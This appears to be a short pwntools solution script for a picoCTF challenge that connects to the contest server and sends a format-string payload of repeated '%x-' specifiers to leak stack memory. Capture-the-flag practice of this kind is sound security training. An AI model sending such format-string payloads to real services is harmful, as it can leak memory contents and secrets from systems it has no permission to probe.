from pwn import *

r = remote("mercury.picoctf.net", 27912)

r.sendline(b"1")
payload = b"%x-"*50
r.sendline(payload)

r.interactive()